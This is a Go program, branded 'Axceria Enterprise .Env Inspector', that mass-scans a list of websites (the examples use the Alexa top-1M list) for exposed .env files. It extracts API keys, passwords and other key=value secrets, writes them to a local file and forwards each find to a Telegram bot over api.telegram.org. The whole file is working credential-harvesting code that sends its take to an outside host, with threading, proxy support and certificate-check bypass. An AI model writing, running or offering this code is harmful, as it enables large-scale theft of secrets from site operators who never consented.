package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	URL "net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"context"
	
	"github.com/mmpx12/optionparser"
	"github.com/fatih/color"
)

var (
	success   int32
	mu        = &sync.Mutex{}
	thread    = make(chan struct{}, 50)
	wg        sync.WaitGroup
	output    = "env_results.txt"
	proxy     string
	insecure  bool
	version   = "1.0.3"
	userAgent = "Mozilla/5.0 (X11; Linux x86_64)"
	path      = []string{"/.env"}
)

func CheckEnv(client *http.Client, url, path string) {
	defer wg.Done()
	req, err := http.NewRequest("GET", "https://"+url+path, nil)
	if err != nil {
		<-thread
		return
	}
	req.Header.Add("User-Agent", userAgent)
	//prevent RAM exhaustion from large body
	req.Header.Set("Range", "bytes=0-6000")
	resp, err := client.Do(req)
	if err != nil {
		<-thread
		return
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	//prevent RAM exhaustion from large body if range header isn't honored
	body, err := ioutil.ReadAll(io.LimitReader(resp.Body, 6000))
	if err != nil {
		<-thread
		return
	}
	match, err := regexp.MatchString(`(?mi)<body|<script|<html>|<?php`, string(body))
	if err != nil {
		<-thread
		return
	}
	if len(body) >= 3700 || match {
		<-thread
		return
	}
	r := regexp.MustCompile(`(?m)^([A-Za-z0-9#-_]){1,35}[\s]{0,10}=.{2,100}$`)
	if r.MatchString(string(body)) {
		all := r.FindAllString(string(body), -1)
		if len(all) > 5 {
			mu.Lock()
			atomic.AddInt32(&success, 1)
			WriteToFile("============================\n" + resp.Request.URL.String())
			color.Set(color.FgRed)
			fmt.Println("\033[1K\rENV FOUND:", resp.Request.URL.String())
			color.Unset()
			for _, j := range all {
				key, val, _ := strings.Cut(j, "=")
				color.Set(color.FgYellow)
				fmt.Printf("%s=%s\n", key, val)
				color.Unset()
				WriteToFile(key + "=" + val)
			}

			// Send message to Telegram using BOT API
			sendMessageToTelegram(resp.Request.URL.String(), all)
			mu.Unlock()
			<-thread
			return
		}
	}
	<-thread
}

func sendMessageToTelegram(url string, data []string) {
    // Replace with your actual bot token and chat ID
    botToken := "YOUR_BOT_TOKEN"
    chatID := "YOUR_CHAT_ID"

    msg := fmt.Sprintf("Url:\n%s\n\nData:\n%s", url, strings.Join(data, "\n"))

    // Use a client for easier HTTP handling
    client := &http.Client{}

    req, err := http.NewRequestWithContext(context.Background(), "POST", fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken), strings.NewReader(fmt.Sprintf(`{"chat_id": "%s", "text": "%s"}`, chatID, msg)))
    if err != nil {
        fmt.Println("Error creating Telegram request:", err)
        return
    }
    req.Header.Set("Content-Type", "application/json")

    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error sending Telegram message:", err)
        return
    }
    defer resp.Body.Close()

    fmt.Println("Telegram message sent with status:", resp.Status)
}

func WriteToFile(target string) {
	f, _ := os.OpenFile(output, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0666)
	defer f.Close()
	fmt.Fprintln(f, target)
}

func LineNBR(f string) int {
	r, _ := os.Open(f)
	defer r.Close()
	buf := make([]byte, 32*1024)
	count := 0
	lineSep := []byte{'\n'}
	for {
		c, err := r.Read(buf)
		count += bytes.Count(buf[:c], lineSep)
		switch {
		case err == io.EOF:
			return count
		case err != nil:
			return 0
		}
	}
}

func main() {
	var threads, input, env string
	var printversion bool
	op := optionparser.NewOptionParser()
	color.Set(color.FgMagenta)
	op.Banner = "Scan for exposed env file\n\nUsage:\n"
	color.Unset()
	color.Set(color.FgBlue)
	op.On("-t", "--thread NBR", "Number of threads (default 50)", &threads)
	op.On("-o", "--output FILE", "Output file (default found_env.txt)", &output)
	op.On("-i", "--input FILE", "Input file", &input)
	op.On("-e", "--env-path ENV", "Env Path comma sparated (default '/.env')", &env)
	op.On("-k", "--insecure", "Ignore certificate errors", &insecure)
	op.On("-u", "--user-agent USR", "Set user agent", &userAgent)
	op.On("-p", "--proxy PROXY", "Use proxy (proto://ip:port)", &proxy)
	op.On("-V", "--version", "Print version and exit", &printversion)
	op.Exemple("xenv -i alexa-top-1M.lst")
	op.Exemple("xenv -k -e /.env,/api/.env,/admin/.env -i alexa-top-1M.lst")
	color.Unset()
	op.Parse()
	fmt.Printf("\033[31m")
	op.Logo("[Axceria Enterprise .Env Inspector]", "doom", false)
	fmt.Printf("\033[0m")

	if printversion {
		fmt.Println("version:", version)
		os.Exit(1)
	}

	if threads != "" {
		tr, _ := strconv.Atoi(threads)
		thread = make(chan struct{}, tr)
	}

	if input == "" {
		fmt.Println("[!] Input file not specified / does not exist.")
		op.Help()
		os.Exit(1)
	}

	if env != "" {
		path = strings.Split(env, ",")
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			DisableKeepAlives: true,
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: insecure},
		},
	}
	if proxy != "" {
		proxyURL, _ := URL.Parse(proxy)
		client = &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			},
		}
	}

	log.SetOutput(io.Discard)
	os.Setenv("GODEBUG", "http2client=0")
	readFile, err := os.Open(input)
	defer readFile.Close()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fileScanner := bufio.NewScanner(readFile)
	fileScanner.Split(bufio.ScanLines)
	i := 0
	total := LineNBR(input) * len(path)

	for fileScanner.Scan() {
		target := fileScanner.Text()
		for _, p := range path {
			i++
			mu.Lock()
			fmt.Printf("\033[1K\r[%d/%d (%d)] %s%s", i, total, int(success), target, p)
			mu.Unlock()
			thread <- struct{}{}
			wg.Add(1)
			go CheckEnv(client, target, p)
		}
	}
	wg.Wait()
	fmt.Printf("\033[1K\rFound %d env files.\n", success)
}
